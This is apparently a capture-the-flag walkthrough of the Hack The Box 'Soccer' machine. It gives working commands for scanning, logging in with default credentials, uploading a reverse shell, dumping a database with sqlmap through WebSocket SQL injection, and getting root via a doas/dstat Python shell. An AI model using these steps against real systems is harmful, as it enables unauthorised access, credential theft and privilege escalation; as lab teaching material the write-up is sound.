## Walkthrough

1. Run nmap scan

`nmap -sC -sV -p- -Pn -T5 -oN soccer.htb`

2. There are only 3 ports open: 22, 80 and 9091. Since SSH port 22 is a very uncommon route to exploit for initial foothold, we focus our attention on the other 2 ports. Particularly, a web server is one of the best places to start. We do subdomain enumeration and directory busting using ffuf.

`ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`

3. Found directory /tiny! We land on a Tiny File Manager login page. We try the default credentials of admin:admin@123 and we successfully login!

4. We check out the site and find that we can upload files to the /tiny/uploads/ directory! We upload a PHP reverse shell one liner and get a reverse shell back!

5. Looking at the /home directory, we find only 1 folder for /player. So assuming the next user we need is player, we look for all files that have "player" in it and we come across the soc-player subdomain

`grep -rnw "player" / 2>/dev/null`

6. Add the subdomain to our /etc/hosts file and go to the site. We sign up for the site and notice there's a call to port 9091 that we enumerated before with Nmap

<img width="1105" height="840" alt="image" src="https://github.com/user-attachments/assets/d9b6b8fd-9529-4412-af9c-3d63e9988731" />

7. The ticket check feature is vulnerable to SQL injection. 

<img width="552" height="337" alt="image" src="https://github.com/user-attachments/assets/0b7a4379-d9f2-41bd-a18d-e2cf3c0ec36b" />

<img width="568" height="339" alt="image" src="https://github.com/user-attachments/assets/57224d0e-ab2c-456e-8cc4-2d28c784853b" />

8. Since this is a blind SQLi vulnerability, we won't exploit this manually but use SqlMap. Luckily, SqlMap is compatible with WebSockets, so we use it to enumerate the database and get user player's plaintext password!

`sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "59286"}' --batch --level 5 --risk 3 --dbms mysql --threads 5 -D soccer_db -T accounts --dump`

<img width="913" height="1194" alt="image" src="https://github.com/user-attachments/assets/9e73d8dd-36ba-4d11-b737-3fde8af06413" />

9. Now SSH into the machine as player and get the user flag!

<img width="272" height="68" alt="image" src="https://github.com/user-attachments/assets/00503a7e-2e25-470d-90a6-6444a8a46b0e" />

10. After doing basic enumeration, we look for SUID files to privesc to root.

`find / -perm -4000 2>/dev/null`

<img width="558" height="506" alt="image" src="https://github.com/user-attachments/assets/3f6ff0de-148a-47e7-9fec-f18d6a6ac4d0" />

11. Most of these don't really stand out, except for the doas file. The doas command is one that allows us to run scripts as another user. We look for any files related to it using the find command once again

`find / 2>/dev/null | grep doas`

<img width="557" height="184" alt="image" src="https://github.com/user-attachments/assets/186963ce-1431-4f04-bc62-e2e22fce5433" />

12. We find that the doas command lets us run the dstat command as root. There is a privesc path on GTFOBins for dstat.

<img width="831" height="208" alt="image" src="https://github.com/user-attachments/assets/94f6a726-e2d2-4bcc-a481-02db9bc2a030" />

13. So following the steps on GTFOBins, we write a python shell file to the `/usr/local/share/dstat` folder. 

`echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_shell.py`

14. Then, with doas, we call the dstat command and we get a root shell and the root flag!

`doas /usr/bin/dstat --shell`
